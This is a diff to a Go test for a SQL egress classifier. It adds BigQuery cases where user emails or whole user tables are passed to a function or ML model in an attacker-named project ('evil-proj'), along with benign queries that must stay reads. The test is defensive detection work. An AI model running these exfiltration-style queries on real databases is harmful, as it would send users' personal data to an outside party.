@@ -74,7 +74,13 @@ func TestClassifySQLEgress(t *testing.T) {
 			`SELECT extractvalue(xmltype(utl_raw.cast_to_varchar2(hextoraw(:1))), '/a') FROM dual`,
 		},
 		"snowflake": {"COPY INTO @stage FROM t"},
-		"bigquery":  {"SELECT * FROM EXTERNAL_QUERY('conn','select 1')", "EXPORT DATA OPTIONS(uri='gs://x/*') AS SELECT 1"},
+		"bigquery": {"SELECT * FROM EXTERNAL_QUERY('conn','select 1')", "EXPORT DATA OPTIONS(uri='gs://x/*') AS SELECT 1",
+			// a routine or model in another project may be a remote function of
+			// that project's owner: it gets the rows
+			"SELECT evil-proj.ds.fn(email) FROM users", "SELECT `evil-proj.ds.fn`(email) FROM users",
+			"SELECT `evil-proj`.ds.fn(email) FROM users", "SELECT * FROM evil.ds.tvf((SELECT email FROM users))",
+			"SELECT * FROM ML.PREDICT(MODEL `evil-proj.ds.m`, (SELECT * FROM users))",
+			"SELECT * FROM ML.PREDICT(MODEL evil-proj.ds.m, TABLE users)"},
 	}
 	for kind, list := range cases {
 		for _, q := range list {
@@ -85,6 +91,12 @@ func TestClassifySQLEgress(t *testing.T) {
 			if !p.NeedsWrite() {
 				t.Errorf("%s %q: runs without --write", kind, q)
 			}
+		}
+	}
+	for _, q := range []string{"SELECT SAFE.NET.HOST(url) FROM t", "SELECT ds.fn(x) FROM t", "SELECT * FROM ML.PREDICT(MODEL ds.m, TABLE t)",
+		"SELECT * FROM `p.ds.t`", "SELECT NET.HOST(u), SAFE_CAST(x AS INT64) FROM p.ds.t"} {
+		if p, err := ClassifySQL("bigquery", q); err != nil || p.NeedsWrite() {
+			t.Errorf("bigquery %q: %v %v, want a read", q, err, p.RuleIDs)
 		}
 	}
 	// XML parsed from a column stays a read
